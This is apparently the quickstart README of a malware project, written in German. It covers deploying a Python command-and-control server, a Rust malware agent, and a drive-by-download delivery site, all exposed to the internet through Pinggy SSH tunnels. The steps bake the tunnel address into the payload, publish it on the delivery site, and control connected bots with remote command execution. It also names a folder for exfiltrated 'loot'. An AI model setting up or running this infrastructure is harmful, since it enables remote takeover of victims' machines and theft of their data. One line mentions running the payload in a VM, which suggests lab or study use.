# Quickstart Guide

## Voraussetzungen

- **Docker** + Docker Compose
- **Python 3.8+** (für lokale Ausführung)
- **Rust/Cargo** (für lokale Ausführung)
- **SSH** (für Pinggy Tunnel)

---

## Option 1: Docker (Empfohlen)

### Starten

```bash
# Alle Services starten
docker compose up -d

# C2-Server interaktiv starten (für Bot-Kontrolle)
docker attach c2-server
```

### Prüfen

```bash
# Status aller Container
docker compose ps

# Pinggy URLs aus Logs lesen
docker logs pinggy-c2 2>&1 | grep -E "tcp://|URL"
docker logs pinggy-delivery 2>&1 | grep -E "http://|URL"
```

### Payload bauen (mit dynamischer C2-Adresse)

```bash
# C2_HOST und C2_PORT von pinggy-c2 Logs übernehmen
C2_HOST=<host-von-pinggy> C2_PORT=<port> docker compose --profile build run builder
```

### Stoppen

```bash
docker compose down
```

---

## Option 2: Lokal (Automatisiert)

### Starten

```bash
./scripts/start_all.sh
```

> Dieses Skript:
> 1. Startet Pinggy Tunnel
> 2. Aktualisiert C2-Adresse in `main.rs`
> 3. Startet C2-Server
> 4. Kompiliert Payloads
> 5. Startet Delivery-Server

### Stoppen

```bash
# Ctrl+C im Terminal
# Oder manuell:
pkill -f "python3 server.py"
pkill -f "ssh.*pinggy"
```

---

## Option 3: Manuell (Schritt für Schritt)

### 1. Pinggy Tunnel starten

```bash
ssh -p 443 -R0:localhost:4444 tcp@a.pinggy.io
```
> Notiere die ausgegebene `tcp://host:port` URL!

### 2. C2-Adresse in Rust Code eintragen

In `malware_agent/src/main.rs`:
```rust
const C2_IP: &str = "<PINGGY_HOST>";
const C2_PORT: u16 = <PINGGY_PORT>;
```

### 3. C2-Server starten

```bash
cd c2_server && python3 server.py
```

### 4. Payload kompilieren

```bash
cd malware_agent && cargo build --release
cp target/release/rust-mw ../delivery/DbD-Site/files/payload_linux
```

### 5. Delivery-Server starten

```bash
cd delivery/DbD-Site && python3 server.py
```

---

## Funktionstest

| Komponente | Test | Erwartetes Ergebnis |
|------------|------|---------------------|
| C2-Server | `nc -zv localhost 4444` | Connection succeeded |
| Delivery | `curl http://localhost:8080` | HTML-Response |
| Pinggy C2 | `nc -zv <pinggy-host> <port>` | Connection succeeded |
| Payload | Ausführen in VM | Verbindung im C2-Server sichtbar |

### C2-Server Befehle testen

Nach Payload-Ausführung im C2-Server:
```
help              # Zeigt verfügbare Befehle
list              # Zeigt verbundene Bots
select <id>       # Bot auswählen
exec whoami       # Befehl ausführen
```

---

## Troubleshooting

| Problem | Lösung |
|---------|--------|
| Pinggy URL nicht sichtbar | `docker logs pinggy-c2` oder SSH-Output prüfen |
| Bot verbindet nicht | C2-Adresse in `main.rs` korrekt? Payload neu kompilieren! |
| Permission denied | `chmod +x scripts/*.sh` |
| Port bereits belegt | `lsof -i :4444` → Prozess beenden |

---

## Wichtige Pfade

- **Payloads**: `delivery/DbD-Site/files/`
- **Exfiltrierte Daten**: `loot/`
- **C2-Server**: `c2_server/server.py`
- **Rust Agent**: `malware_agent/src/`
